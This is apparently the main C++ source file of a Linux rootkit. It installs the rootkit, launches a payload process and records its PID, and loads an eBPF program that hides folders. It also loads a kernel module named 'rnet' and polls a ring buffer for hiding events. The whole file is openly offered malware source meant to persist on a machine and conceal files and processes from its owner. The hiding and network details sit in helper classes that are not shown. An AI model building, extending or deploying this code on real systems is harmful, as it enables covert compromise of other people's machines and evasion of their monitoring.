#include "common.h"
#include "rootkit/ArgManager.hpp"
#include "rootkit/ConfigManager.hpp"
#include "rootkit/RnetLoader.hpp"
#include "rootkit/PayloadLoader.hpp"
#include "rootkit/RootkitBpfHelper.hpp"
#include "rootkit/RootkitInstaller.hpp"
#include "rootkit/Utils.hpp"
#include "rootkit/issues/ChainLogger.hpp"
#include "rootkit/issues/ConsoleLogger.hpp"
#include "rootkit/issues/Logger.hpp"
#include "rootkit/issues/SysLogger.hpp"

#include <csignal>
#include <iostream>
#include <memory>
#include <optional>
#include <sys/stat.h>
#include <sys/syslog.h>
#include <syslog.h>
#include <vector>

static volatile bool exiting = false;
static void sig_handler(int) { exiting = true; }

static int rb_event(void * ctx, void * data, size_t data_sz) {
    const struct event * e = reinterpret_cast<const struct event *>(data);
    printf("Hidden Folder: %s, inode: %llu\n", (char *)e->filename, e->inode);
    return 0;
}

void run_rootkit(rootkit::ConfigManager& confManager, const rootkit::issues::Logger& logger);
void install_rootkit(rootkit::ConfigManager& confManager, const rootkit::issues::Logger& logger);

int main(int argc, char ** argv) {
    // Set signal handler
    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    // Create a chain logger, made of console and sys logger
    std::vector<std::unique_ptr<rootkit::issues::Logger>> loggers;
        loggers.push_back(std::make_unique<rootkit::issues::ConsoleLogger>());
        loggers.push_back(std::make_unique<rootkit::issues::SysLogger>());
    rootkit::issues::ChainLogger logger(std::move(loggers));
    // rootkit::issues::SysLogger logger;

    // Process args
    rootkit::ArgManager argManager(argc, argv);
    auto args = argManager.getArgs();

    // Change current working directory if it's desired behavior
    if (!args.cwd.empty()) {
        chdir(args.cwd.c_str());
    }
    // Log cwd
    syslog(LOG_INFO, "Start main; pwd: %s\n", rootkit::utils::get_cwd().c_str());

    // Process configuration
    rootkit::ConfigManager confManager(0);
    if (!confManager.read()) {
        logger.print_error("Couldn't read the config");
        return 1;
    }

    if (args.install)
        install_rootkit(confManager, logger);
    else if (args.run)
        run_rootkit(confManager, logger);
    else if (args.help)
        argManager.help();

    return 0;
}

void install_rootkit(rootkit::ConfigManager& confManager,
    const rootkit::issues::Logger& logger)
{
    auto rt_config = confManager.get_rt_config();
    if (!rt_config.has_value()) {
        logger.print_error("No rt configuration found");
        return;
    }

    rootkit::RootkitInstaller installer(rt_config.value(), logger);
    installer.install();
}

void run_rootkit(rootkit::ConfigManager& confManager,
    const rootkit::issues::Logger& logger)
{
    rootkit::PayloadLoader payload(confManager.get_payload_config().value(), logger);
    // Payload will be stopped when the variable goes out of scope,
    // or manually by payload.stop() or payload.kill()
    // Start payload
    payload.start();

    // Add payload pid to configuration
    auto payload_pid = payload.get_pid();
    if (payload_pid.has_value())
        confManager.add_payload_pid(payload_pid.value());

    // Load bpf program and its syscalls
    rootkit::RootkitBpfHelper rootkit(confManager.get_bpf_config().value(), rb_event, logger);
    // Load rnet kernel module
    rootkit::RnetLoader module(confManager.get_rnet_config().value(), DEV_NAME, logger);

    std::cout << "listening for events... Ctrl-C to exit\n";

    // Get data from ring buffer till exit signal or error
    while (!exiting) {
        rootkit.rb_poll(1000);
        if (rootkit.status() != std::nullopt) {
            break;
        }
    }
}
